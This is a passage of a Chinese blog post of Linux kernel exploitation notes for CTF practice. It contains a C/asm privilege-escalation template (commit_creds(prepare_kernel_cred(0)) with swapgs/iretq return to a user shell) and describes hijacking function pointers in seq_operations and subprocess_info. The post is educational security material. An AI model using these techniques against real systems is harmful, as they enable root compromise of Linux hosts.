class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%cs, %3\n&quot;</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(status.ss),<span class="string">&quot;=r&quot;</span>(status.rsp),<span class="string">&quot;=r&quot;</span>(status.rflags),<span class="string">&quot;=r&quot;</span>(status.cs)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">&quot;memory&quot;</span></span><br><span class="line">        );</span><br><span class="line">    status.rip = shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retUsr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $status,%rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h1 id="九、常见可利用结构体"   >
+          <a href="#九、常见可利用结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、常见可利用结构体" class="headerlink" title="九、常见可利用结构体"></a>九、常见可利用结构体</h1>
+      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x01-tty-%E7%B3%BB%E5%88%97%E7%BB%93%E6%9E%84%E4%BD%93" >【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-tty系列结构体"   >
+          <a href="#1-tty系列结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-tty系列结构体" class="headerlink" title="1.tty系列结构体"></a>1.tty系列结构体</h2>
+      <p>打开设备：<code>/dev/ptmx</code></p>
+<p>tty_struct 的魔数为 <code>0x5401</code>，位于该结构体的开头，我们可以利用对该魔数的搜索以锁定该结构体。</p>
+<p>上面<strong>堆-&gt;借助ptmx设备</strong>讲过了</p>
+
+        <h2 id="2-seq-operations结构体"   >
+          <a href="#2-seq-operations结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-seq-operations结构体" class="headerlink" title="2.seq_operations结构体"></a>2.seq_operations结构体</h2>
+      <p>打开设备：<code>proc/self/stat</code></p>
+<p>该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，大小为0x20</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">	void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">	void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">	void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">	int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
+
+<p>通过函数指针泄露地址，再劫持start函数指针后对该设备进行读写即可调用劫持的start函数指针，控制程序流程。读写的时候可通过syscall创建<code>pt_regs</code>结构体来布置内核栈环境，然后通过<code>swapgs_restore_regs_and_return_to_usermode</code>函数返回用户空间。</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="3-subprocess-info结构体"   >
+          <a href="#3-subprocess-info结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-subprocess-info结构体" class="headerlink" title="3.subprocess_info结构体"></a>3.subprocess_info结构体</h2>
+      <p>通过以下语句可以分配得到一个<code>subprocess_info</code>结构体，大小为0x60，使用kmalloc-128分配器</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(22, AF_INET, 0);</span><br></pre></td></tr></table></div></figure>
+
+<p>结构体</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct subprocess_info &#123;</span><br><span class="line">    struct work_struct work;</span><br><span class="line">    struct completion *complete;</span><br><span class="line">    const char *path;</span><br><span class="line">    char **argv;</span><br><span class="line">    char **envp;</span><br><span class="line">    struct file *file;</span><br><span class="line">    int wait;</span><br><span class="line">    int retval;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    int (*init)(struct subprocess_info *info, struct cred *new);</span><br><span class="line">    void (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    void *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>
+
+<p>该结构体在分配时最终会调用其中的<code>void (*cleanup)(struct subprocess_info *info);</code>函数指针，所以如果存在一个UAF和条件竞争，在分配时启动另一个线程不断修改该函数指针，那么就能劫持程序流，再利用一些gadget就可以控制得到。</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264563#h2-2" >SCTF flying_kernel 出题总结 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">kernel笔记汇总</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">2021HWS固件学习</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/01/09/Burpsuite%E4%BD%BF%E7%94%A8/"><span class="paginator-prev__text">Burpsuite使用</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-text">
+          一、查看保护</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-KPTI"><span class="toc-text">
+          1.KPTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SMEP%E3%80%81SMAP%E3%80%81KASLR%E7%AD%89"><span class="toc-text">
+          2.SMEP、SMAP、KASLR等</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMEP%E5%92%8CSMAP"><span class="toc-text">
+          (1)SMEP和SMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-KASLR"><span class="toc-text">
+          (2)KASLR</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E4%BF%9D%E6%8A%A4"><span class="toc-text">
+          3.其他保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-STACK-PROTECTOR"><span class="toc-text">
+          (1)STACK PROTECTOR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%82%E8%80%83README-MD"><span class="toc-text">
+          (2)参考README.MD</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          二、泄露地址</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          1.前置地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          2.获取基地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%8B%E8%BD%BDgeneric%E7%89%88%E6%9C%AC%E5%86%85%E6%A0%B8"><span class="toc-text">
+          三、下载generic版本内核</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%89%93%E5%8D%B0%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          四、打印地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98"><span class="toc-text">
+          五、搜索内存</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-text">
+          六、常见漏洞及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%A0%86"><span class="toc-text">
+          1.堆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
+          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kmalloc-caches"><span class="toc-text">
+          kmalloc_caches</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SLUB%E4%B8%8B"><span class="toc-text">
+          SLUB下</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E7%BB%B4kmalloc-caches"><span class="toc-text">
+          一维kmalloc_caches</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%9A%E7%BB%B4kmalloc-caches"><span class="toc-text">
+          多维kmalloc_caches</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%85SLAB%E4%B8%8B"><span class="toc-text">
+          仅SLAB下</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A"><span class="toc-text">
+          🔺注：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SLAB%EF%BC%9A"><span class="toc-text">
+          SLAB：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SLUB%EF%BC%9A"><span class="toc-text">
+          SLUB：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
+          修改cred结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9FD%E7%94%B3%E8%AF%B7"><span class="toc-text">
+          修改FD申请</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-HARDENED%E4%BF%9D%E6%8A%A4"><span class="toc-text">
+          (1)HARDENED保护</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A-1"><span class="toc-text">
+          🔺注：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AFKASLR"><span class="toc-text">
+          未开启KASLR</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BC%80%E5%90%AFKASLR"><span class="toc-text">
+          开启KASLR</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A00x8%E4%B8%BA%E4%BE%8B"><span class="toc-text">
+          ①0x8为例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A10x10%EF%BC%8C0x20%EF%BC%8C0x30%E7%AD%89%E7%AD%89"><span class="toc-text">
+          ②0x10，0x20，0x30等等</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2random"><span class="toc-text">
+          泄露random</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%A0%86%E5%9C%B0%E5%9D%80%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">
+          获得堆地址任意写</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-HARDENED%E6%96%B0%E7%89%88%E6%94%B9%E5%8A%A8"><span class="toc-text">
+          (2)HARDENED新版改动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kasan-reset-tag"><span class="toc-text">
+          kasan_reset_tag</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#swab"><span class="toc-text">
+          swab</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#double-free"><span class="toc-text">
+          double_free</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-RANDOM%E4%BF%9D%E6%8A%A4"><span class="toc-text">
+          (3)RANDOM保护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9prctl%E5%87%BD%E6%95%B0%E5%AF%BB%E6%89%BEcred%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          借助prctl函数寻找cred地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9stat%E8%AE%BE%E5%A4%87%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-text">
+          借助stat设备修改函数指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9ptmx%E8%AE%BE%E5%A4%87-tty-struct"><span class="toc-text">
+          借助ptmx设备(tty_struct)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%88"><span class="toc-text">
+          2.栈</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-commit-creds-prepare-kernel-cred-0"><span class="toc-text">
+          (1)commit_creds(prepare_kernel_cred(0));</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%BC%80%E5%90%AFSMEP%E6%83%85%E5%86%B5"><span class="toc-text">
+          ①开启SMEP情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP%E5%85%B3%E9%97%ADSMEP%E4%BF%9D%E6%8A%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%E7%94%A8%E6%88%B7%E6%80%81%E6%8F%90%E6%9D%83%E4%BB%A3%E7%A0%81"><span class="toc-text">
+          ROP关闭SMEP保护，执行用户态提权代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP%E5%9C%A8%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E5%90%8E%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81%E8%B5%B7Shell"><span class="toc-text">
+          ROP在内核态提权后返回用户态起Shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%9C%AA%E5%BC%80%E5%90%AFSMEP%E6%83%85%E5%86%B5"><span class="toc-text">
+          ②未开启SMEP情况</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%89%8B%E6%AE%B5"><span class="toc-text">
+          3.常见提权手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9modprobe-path"><span class="toc-text">
+          修改modprobe_path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9init-cred"><span class="toc-text">
+          修改init_cred</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81prtcl-hook"><span class="toc-text">
+          劫持prtcl_hook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8A%AB%E6%8C%81%E4%B8%BAorderly-poweroff%E5%87%BD%E6%95%B0"><span class="toc-text">
+          (1)劫持为orderly_poweroff函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8A%AB%E6%8C%81%E4%B8%BApoweroff-work-fun%E5%87%BD%E6%95%B0"><span class="toc-text">
+          (2)劫持为poweroff_work_fun函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          (3)获取地址</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A0prctl-hook"><span class="toc-text">
+          ①prctl_hook</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A1poweroff-cmd%E3%80%81orderly-poweroff%E3%80%81poweroff-work-fun"><span class="toc-text">
+          ②poweroff_cmd、orderly_poweroff、poweroff_work_fun</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%84%8F%E6%83%B3%E4%B8%8D%E5%88%B0%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-text">
+          七、意想不到的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-QEMU%E9%80%83%E9%80%B8"><span class="toc-text">
+          1.QEMU逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98"><span class="toc-text">
+          2.权限配置问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-bin%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-text">
+          (1)bin目录不为ROOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8D%E4%B8%BAROOT"><span class="toc-text">
+          (2)根目录不为ROOT</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%A8%A1%E6%9D%BF"><span class="toc-text">
+          八、模板</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%9D%E5%AD%98%E7%8A%B6%E6%80%81"><span class="toc-text">
+          1.保存状态</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%94%A8%E6%88%B7%E6%80%81%E8%B5%B7Shell"><span class="toc-text">
+          2.用户态起Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81"><span class="toc-text">
+          3.返回用户态</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B2%A1%E6%9C%89KPTI"><span class="toc-text">
+          (1)没有KPTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%98%E5%9C%A8KPTI"><span class="toc-text">
+          (2)存在KPTI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%88%86%E7%A0%B4KASLR"><span class="toc-text">
+          4.爆破KASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-POC%E9%87%8C"><span class="toc-text">
+          (1)POC里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%93%E8%BF%9C%E7%A8%8B%E7%9A%84EXP"><span class="toc-text">
+          (2)打远程的EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-retUsr%E6%A8%A1%E6%9D%BF"><span class="toc-text">
+          5.retUsr模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%B8%B8%E8%A7%81%E5%8F%AF%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
+          九、常见可利用结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-tty%E7%B3%BB%E5%88%97%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
+          1.tty系列结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-seq-operations%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
+          2.seq_operations结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-subprocess-info%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
+          3.subprocess_info结构体</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">115</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">58</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">57</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
